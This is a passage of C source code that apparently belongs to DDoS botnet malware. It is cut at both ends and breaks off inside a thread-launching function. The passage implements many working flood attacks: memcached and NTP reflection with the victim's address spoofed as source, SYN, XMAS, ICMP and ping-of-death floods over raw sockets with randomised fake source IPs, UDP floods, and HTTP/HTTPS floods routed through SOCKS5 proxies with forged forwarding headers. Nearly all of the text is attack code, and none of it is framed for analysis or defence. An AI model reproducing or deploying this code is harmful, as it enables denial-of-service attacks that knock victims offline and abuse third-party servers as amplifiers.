            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) continue;
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(a->port);
            if (is_ip) addr.sin_addr.s_addr = s_addr;
            else memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
            for (int i = 0; i < packets && !stop_attacks; i++)
                sendto(sock, ntp_payload, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
            close(sock);
        }
    }
    return NULL;
}

static const unsigned char mem_payload[] = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";

void* attack_mem(void *arg) {
    ntp_args_t *a = (ntp_args_t*)arg;
    static char mem_servers[200][128];
    static int mem_count = 0;
    if (mem_count == 0) {
        FILE *f = fopen("memsv.txt", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f) && mem_count < 200) {
                line[strcspn(line, "\r\n")] = 0;
                if (strlen(line) > 0) strcpy(mem_servers[mem_count++], line);
            }
            fclose(f);
        }
        if (mem_count == 0) {
            strcpy(mem_servers[0], "8.8.8.8");
            strcpy(mem_servers[1], "1.1.1.1");
            mem_count = 2;
        }
    }
    int packets = 1024 + rand() % 58977;
    while (!stop_attacks && time(NULL) < a->end_time) {
        char *server = mem_servers[rand() % mem_count];
        unsigned long s_addr = inet_addr(server);
        int is_ip = (s_addr != INADDR_NONE);
        struct hostent *he = NULL;
        if (!is_ip) {
            he = safe_gethostbyname(server);
            if (!he) continue;
        }
        int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock >= 0) {
            char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(mem_payload)];
            struct iphdr *iph = (struct iphdr*)packet;
            struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
            memset(packet, 0, sizeof(packet));
            iph->ihl = 5; iph->version = 4; iph->tos = 0;
            iph->tot_len = htons(sizeof(packet));
            iph->id = htons(rand()); iph->frag_off = 0; iph->ttl = 64;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = inet_addr(a->target);
            if (is_ip) iph->daddr = s_addr;
            else memcpy(&iph->daddr, he->h_addr_list[0], he->h_length);
            iph->check = 0;
            udph->source = htons(a->port);
            udph->dest = htons(11211);
            udph->len = htons(sizeof(packet) - sizeof(struct iphdr));
            udph->check = 0;
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), mem_payload, sizeof(mem_payload) - 1);
            for (int i = 0; i < packets && !stop_attacks; i++)
                send(raw_sock, packet, sizeof(packet), 0);
            close(raw_sock);
        } else {
            int usock = socket(AF_INET, SOCK_DGRAM, 0);
            if (usock < 0) continue;
            struct sockaddr_in uaddr;
            uaddr.sin_family = AF_INET;
            uaddr.sin_port = htons(11211);
            if (is_ip) uaddr.sin_addr.s_addr = s_addr;
            else memcpy(&uaddr.sin_addr, he->h_addr_list[0], he->h_length);
            sendto(usock, mem_payload, sizeof(mem_payload) - 1, 0, (struct sockaddr*)&uaddr, sizeof(uaddr));
            close(usock);
        }
    }
    return NULL;
}

void* attack_icmp(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) continue;

        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_addr.s_addr = inet_addr(a->target);

        int pkt_size = 1024 + rand() % 59000;
        char *packet = malloc(pkt_size + sizeof(struct icmphdr));
        struct icmphdr *icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->un.echo.id = htons(rand());
        icmp->un.echo.sequence = htons(rand());
        rand_bytes((unsigned char*)(packet + sizeof(struct icmphdr)), pkt_size);
        icmp->checksum = 0;
        sendto(sock, packet, pkt_size + sizeof(struct icmphdr), 0, (struct sockaddr*)&dst, sizeof(dst));
        free(packet);
        close(sock);
    }
    return NULL;
}

void* attack_pod(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) continue;

        char src_ip[16];
        spoofer(src_ip);

        char packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + 60000];
        struct iphdr *iph = (struct iphdr*)packet;
        struct icmphdr *icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
        memset(packet, 0, sizeof(packet));
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(packet));
        iph->id = htons(rand());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = inet_addr(src_ip);
        iph->daddr = inet_addr(a->target);
        iph->check = 0;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->checksum = 0;
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), 'm', 60000);
        send(sock, packet, sizeof(packet), 0);
        close(sock);
    }
    return NULL;
}

int socks5_connect(int proxy_sock, const char *target_host, int target_port) {
    unsigned char buf[512];
    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00;
    if (send(proxy_sock, buf, 3, 0) <= 0) return -1;
    if (recv(proxy_sock, buf, 2, 0) <= 0) return -1;
    if (buf[0] != 0x05 || buf[1] != 0x00) return -1;

    int hlen = strlen(target_host);
    int req_len = 6 + hlen;
    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x03;
    buf[4] = hlen;
    memcpy(buf + 5, target_host, hlen);
    buf[5 + hlen] = (target_port >> 8) & 0xFF;
    buf[6 + hlen] = target_port & 0xFF;
    if (send(proxy_sock, buf, req_len, 0) <= 0) return -1;
    if (recv(proxy_sock, buf, 10, 0) <= 0) return -1;
    if (buf[1] != 0x00) return -1;
    return 0;
}

#ifdef USE_SSL
void* attack_http_spoof(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char *url = a->target;
    char host[256] = {0};
    int target_port = 443;

    char *hstart = strstr(url, "://");
    if (hstart) url = hstart + 3;

    char *host_end = strchr(url, '/');
    size_t host_len;
    if (host_end) host_len = host_end - url;
    else host_len = strlen(url);

    char host_buf[256];
    strncpy(host_buf, url, host_len < 255 ? host_len : 255);
    host_buf[host_len < 255 ? host_len : 255] = '\0';

    char *pcolon = strchr(host_buf, ':');
    if (pcolon) {
        *pcolon = '\0';
        target_port = atoi(pcolon + 1);
    }
    strcpy(host, host_buf);

    while (!stop_attacks && time(NULL) < a->end_time) {
        if (proxy_count <= 0) continue;
        int pi = rand() % proxy_count;
        char proxy_ip[64];
        int proxy_port;
        char *line = proxies[pi];
        char *pcolon2 = strchr(line, ':');
        if (!pcolon2) continue;
        *pcolon2 = '\0';
        strcpy(proxy_ip, line);
        proxy_port = atoi(pcolon2 + 1);
        *pcolon2 = ':';

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in paddr;
        paddr.sin_family = AF_INET;
        paddr.sin_port = htons(proxy_port);
        paddr.sin_addr.s_addr = inet_addr(proxy_ip);

        if (connect(sock, (struct sockaddr*)&paddr, sizeof(paddr)) < 0) {
            close(sock);
            continue;
        }

        if (socks5_connect(sock, host, target_port) < 0) {
            close(sock);
            continue;
        }

        SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
            continue;
        }

        char src1[16], src2[16], src3[16], src4[16];
        spoofer(src1); spoofer(src2); spoofer(src3); spoofer(src4);

        char req[4096];
        snprintf(req, sizeof(req),
            "GET / HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
            "X-Forwarded-Proto: Http\r\n"
            "X-Forwarded-Host: %s, 1.1.1.1\r\n"
            "Via: %s\r\n"
            "Client-IP: %s\r\n"
            "X-Forwarded-For: %s\r\n"
            "Real-IP: %s\r\n"
            "Connection: Keep-Alive\r\n\r\n",
            host, host, src1, src2, src3, src4);
        while (!stop_attacks && time(NULL) < a->end_time) {
            SSL_write(ssl, req, strlen(req));
            SSL_write(ssl, req, strlen(req));
            SSL_write(ssl, req, strlen(req));
        }
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
    }
    return NULL;
}
#endif

void* attack_cfb(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024];
    strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    url_buf[sizeof(url_buf) - 1] = '\0';
    char host[256], path[1024];
    int port;
    parse_url(url_buf, host, &port, path, 80);

    while (!stop_attacks && time(NULL) < a->end_time) {
        struct hostent *he = safe_gethostbyname(host);
        if (!he) continue;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char ua[256];
            strcpy(ua, rand_ua());
            char get_req[2048], head_req[2048];
            snprintf(get_req, sizeof(get_req),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                host, ua);
            snprintf(head_req, sizeof(head_req),
                "HEAD / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                host, ua);
            for (int i = 0; i < 1500 && !stop_attacks; i++) {
                send(sock, get_req, strlen(get_req), 0);
                send(sock, head_req, strlen(head_req), 0);
            }
        }
        close(sock);
    }
    return NULL;
}

void* attack_get(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024];
    strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    url_buf[sizeof(url_buf) - 1] = '\0';
    char host[256], path[1024];
    int port;
    parse_url(url_buf, host, &port, path, 80);

    while (!stop_attacks && time(NULL) < a->end_time) {
        struct hostent *he = safe_gethostbyname(host);
        if (!he) continue;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(a->port);
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char ua[256];
            strcpy(ua, rand_ua());
            char req[2048];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                host, ua);
            for (int i = 0; i < 1500 && !stop_attacks; i++)
                send(sock, req, strlen(req), 0);
        }
        close(sock);
    }
    return NULL;
}

void parse_url(char *url, char *host, int *port, char *path, int default_port) {
    char buf[1024];
    strncpy(buf, url, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    char *hstart = strstr(buf, "://");
    char *scheme = NULL;
    if (hstart) {
        scheme = buf;
        *hstart = '\0';
        url = hstart + 3;
    } else {
        url = buf;
    }
    char *slash = strchr(url, '/');
    if (slash) {
        size_t hlen = slash - url;
        strncpy(host, url, hlen);
        host[hlen] = '\0';
        strncpy(path, slash, 1023);
        path[1023] = '\0';
    } else {
        strcpy(host, url);
        strcpy(path, "/");
    }
    char *qmark = strchr(path, '?');
    if (qmark) {
        char *orig_path = strchr(url, '/');
        if (orig_path) {
            strncpy(path, orig_path, 1023);
            path[1023] = '\0';
        }
    }
    char *pcolon = strchr(host, ':');
    if (pcolon) {
        *pcolon = '\0';
        *port = atoi(pcolon + 1);
    } else if (scheme) {
        if (strcmp(scheme, "https") == 0) *port = 443;
        else if (strcmp(scheme, "http") == 0) *port = 80;
        else *port = default_port;
    } else {
        *port = default_port;
    }
}

#ifdef USE_SSL
void* attack_http2_raw(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024], host[256], path[1024];
    int port;
    if (!strstr(a->target, "://")) {
        snprintf(url_buf, sizeof(url_buf), "https://%s", a->target);
    } else {
        strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    }
    url_buf[sizeof(url_buf) - 1] = '\0';
    parse_url(url_buf, host, &port, path, 443);

    SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        struct hostent *he = safe_gethostbyname(host);
        if (!he) { close(sock); continue; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) != 1) {
            SSL_free(ssl);
            close(sock);
            continue;
        }
        while (!stop_attacks && time(NULL) < a->end_time) {
            char ua[256];
            strcpy(ua, rand_ua());
            char req[4096];
            snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n\r\n",
                path, host, ua);
            SSL_write(ssl, req, strlen(req));
        }
        SSL_free(ssl);
        close(sock);
    }
    SSL_CTX_free(ctx);
    return NULL;
}
#else
void* attack_http2_raw(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024], host[256], path[1024];
    int port;
    strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    url_buf[sizeof(url_buf) - 1] = '\0';
    parse_url(url_buf, host, &port, path, 80);

    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        struct hostent *he = safe_gethostbyname(host);
        if (!he) { close(sock); continue; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        while (!stop_attacks && time(NULL) < a->end_time) {
            char ua[256];
            strcpy(ua, rand_ua());
            char req[4096];
            snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n\r\n",
                path, host, ua);
            send(sock, req, strlen(req), 0);
        }
        close(sock);
    }
    return NULL;
}
#endif

void* attack_udp_gigs(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(a->port);
    addr.sin_addr.s_addr = inet_addr(a->target);

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    unsigned char payload[1450];
    rand_bytes(payload, sizeof(payload));

    while (!stop_attacks && time(NULL) < a->end_time) {
        send(sock, payload, sizeof(payload), 0);
        send(sock, payload, sizeof(payload), 0);
        send(sock, payload, sizeof(payload), 0);
        send(sock, payload, sizeof(payload), 0);
        send(sock, payload, sizeof(payload), 0);
    }
    close(sock);
    return NULL;
}

void* pps_hammer_worker(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    int ttl_vals[] = {64, 128, 255};
    int ttl = ttl_vals[rand() % 3];
    setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));

    unsigned char payload[32];
    memset(payload, 0, 32);
    payload[0] = 0x12; payload[1] = 0x34;
    payload[2] = 0x00; payload[3] = 0x01;
    payload[4] = 0x00; payload[5] = 0x01;
    payload[6] = 0x00; payload[7] = 0x00;
    payload[8] = 0x03; memcpy(payload + 9, "www", 3);
    payload[12] = 0x00; payload[13] = 0xFF;
    payload[14] = 0x01; payload[15] = 0x00;

    int dport_choices[] = {53, 123, 1900, 80, 443};
    int dport = a->port ? a->port : dport_choices[rand() % 5];
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = inet_addr(a->target);

    while (!stop_attacks && time(NULL) < a->end_time)
        sendto(sock, payload, 32, 0, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return NULL;
}

void* attack_pps_hammer(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int n = a->burst_threads > 500 ? 500 : a->burst_threads;
    while (!stop_attacks && time(NULL) < a->end_time) {
        double burst_end = time(NULL) + 1;
        if (burst_end > a->end_time) burst_end = a->end_time;
        pthread_t tids[500];
        for (int i = 0; i < n; i++) {
            attack_args_t *ap = malloc(sizeof(attack_args_t));
            memcpy(ap, a, sizeof(attack_args_t));
            ap->end_time = burst_end;
            pthread_create(&tids[i], NULL, pps_hammer_worker, ap);
        }
        for (int i = 0; i < n; i++)
            pthread_detach(tids[i]);
        sleep(2);
    }
    return NULL;
}


void* attack_httpio(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    char url_buf[1024];
    strncpy(url_buf, a->target, sizeof(url_buf) - 1);
    url_buf[sizeof(url_buf) - 1] = '\0';
    char host[256], path[1024];
    int port;
    parse_url(url_buf, host, &port, path, 80);
    while (!stop_attacks && time(NULL) < a->end_time) {
        struct hostent *he = safe_gethostbyname(host);
        if (!he) continue;
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (a->cfbp == 0 && proxy_count > 0) {
            int pi = rand() % proxy_count;
            char proxy_ip[64];
            int proxy_port;
            char *line = proxies[pi];
            char *pcolon2 = strchr(line, ':');
            if (!pcolon2) { close(sock); continue; }
            *pcolon2 = '\0';
            strcpy(proxy_ip, line);
            proxy_port = atoi(pcolon2 + 1);
            *pcolon2 = ':';
            struct sockaddr_in paddr;
            paddr.sin_family = AF_INET;
            paddr.sin_port = htons(proxy_port);
            paddr.sin_addr.s_addr = inet_addr(proxy_ip);
            if (connect(sock, (struct sockaddr*)&paddr, sizeof(paddr)) < 0) { close(sock); continue; }
            if (socks5_connect(sock, host, a->port) < 0) { close(sock); continue; }
        } else {
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(a->port);
            memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(sock); continue; }
        }
        char ua[256];
        strcpy(ua, rand_ua());
        char req[4096];
        snprintf(req, sizeof(req),
            "GET / HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n\r\n",
            host, ua);
        for (int i = 0; i < 100 && !stop_attacks; i++)
            if (send(sock, req, strlen(req), 0) <= 0) break;
        close(sock);
    }
    return NULL;
}

void* attack_udp_plain(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(a->port);
    addr.sin_addr.s_addr = inet_addr(a->target);
    unsigned char payload[1024];
    rand_bytes(payload, 1024);
    while (!stop_attacks && time(NULL) < a->end_time) {
        if (sendto(sock, payload, 1024, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (sock < 0) return NULL;
        }
    }
    close(sock);
    return NULL;
}

void* attack_dns_pps(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = inet_addr(a->target);
    unsigned char base_hdr[10] = {0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    unsigned char payload[22];
    while (!stop_attacks && time(NULL) < a->end_time) {
        payload[0] = rand() & 0xFF; payload[1] = rand() & 0xFF;
        memcpy(payload + 2, base_hdr, 10);
        for (int i = 0; i < 10; i++) payload[12 + i] = rand() & 0xFF;
        sendto(sock, payload, 22, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(sock);
    return NULL;
}

void* attack_stdhex(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->port);
    sin.sin_addr.s_addr = inet_addr(a->target);
    unsigned char payload[256];
    memset(payload, 0x58, 256);
    payload[0] = 0x58; payload[1] = 0x99; payload[2] = 0x21;
    while (!stop_attacks && time(NULL) < a->end_time) {
        send(sock, payload, 256, 0);
        connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    }
    close(sock);
    return NULL;
}

void* attack_std(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->port);
    sin.sin_addr.s_addr = inet_addr(a->target);
    unsigned char payload[65];
    memset(payload, 0, 65);
    memcpy(payload, "d4mQasDSH6", 10);
    while (!stop_attacks && time(NULL) < a->end_time) {
        send(sock, payload, 65, 0);
        connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    }
    close(sock);
    return NULL;
}

void* attack_stdhex2(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->port);
    sin.sin_addr.s_addr = inet_addr(a->target);
    unsigned char payload[256];
    memset(payload, 0x84, 256);
    while (!stop_attacks && time(NULL) < a->end_time) {
        send(sock, payload, 256, 0);
        connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    }
    close(sock);
    return NULL;
}

void* attack_rst(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    while (!stop_attacks && time(NULL) < a->end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {0, 1000};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(a->port);
        sin.sin_addr.s_addr = inet_addr(a->target);
        if (connect(sock, (struct sockaddr*)&sin, sizeof(sin)) == 0)
            close(sock);
        else
            close(sock);
    }
    return NULL;
}

void* attack_syn_flood(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw < 0) return NULL;
    int tmp = 1;
    setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(a->target);
    dest.sin_port = htons(a->port);

    while (!stop_attacks && time(NULL) < a->end_time) {
        char src_ip_str[16];
        spoofer(src_ip_str);
        memset(packet, 0, sizeof(packet));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = 40 + (rand_cmwc() % 216);
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(src_ip_str);
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, iph->tot_len);

        memset(tcph, 0, sizeof(struct tcphdr));
        tcph->source = rand_cmwc();
        tcph->dest = htons(a->port);
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(1024 + (rand_cmwc() % 64000));
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->check = tcpcsum(iph, tcph);

        sendto(raw, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
    }
    close(raw);
    return NULL;
}

void* attack_xmas(void *arg) {
    attack_args_t *a = (attack_args_t*)arg;
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(a->target);
    memset(dest.sin_zero, 0, sizeof(dest.sin_zero));
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw < 0) return NULL;
    int tmp = 1;
    if (setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) { close(raw); return NULL; }
    int spoofit = a->spoofit > 0 ? a->spoofit : 32;
    in_addr_t netmask;
    if (spoofit == 0) netmask = (~((in_addr_t)-1));
    else netmask = (~((1 << (32 - spoofit)) - 1));
    int pktsize = a->size > 0 ? a->size : 1024;
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + pktsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + pktsize);
    tcph->source = rand_cmwc(); tcph->seq = rand_cmwc(); tcph->ack_seq = 0;
    tcph->doff = 5; tcph->ack = 1; tcph->syn = 1; tcph->psh = 1; tcph->urg = 1;
    tcph->window = rand_cmwc(); tcph->check = 0; tcph->urg_ptr = 0;
    tcph->dest = (a->port == 0 ? rand_cmwc() : htons(a->port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum((unsigned short *)packet, iph->tot_len);
    while (!stop_attacks && time(NULL) < a->end_time) {
        sendto(raw, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
        iph->saddr = htonl(getRandomIP(netmask));
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *)packet, iph->tot_len);
    }
    close(raw);
    return NULL;
}


void launch_attack_threads(void *(*func)(void*), int threads, attack_args_t *base) {

    pthread_t tids[MAX_THREADS_PER_ATTACK];
    int n = threads > MAX_THREADS_PER_ATTACK ? MAX_THREADS_PER_ATTACK : threads;
    for (int i = 0; i < n; i++) {
        attack_args_t *a = malloc(sizeof(attack_args_t));
        memcpy(a, base, sizeof(attack_args_t));
        pthread_create(&tids[i], NULL, func, a);
        pthread_detach(tids[i]);
    }

}

void launch_attack_ntp_threads(int threads, ntp_args_t *base) {
    pthread_t tids[MAX_THREADS_PER_ATTACK];
    int n = threads > MAX_THREADS_PER_ATTACK ? MAX_THREADS_PER_ATTACK : threads;
    for (int i = 0; i < n; i++) {
        ntp_args_t *a = malloc(sizeof(ntp_args_t));
        memcpy(a, base, sizeof(ntp_args_t));
        pthread_create(&tids[i], NULL, attack_ntp, a);
        pthread_detach(tids[i]);
    }
}

void launch_attack_mem_threads(int threads, ntp_args_t *base) {
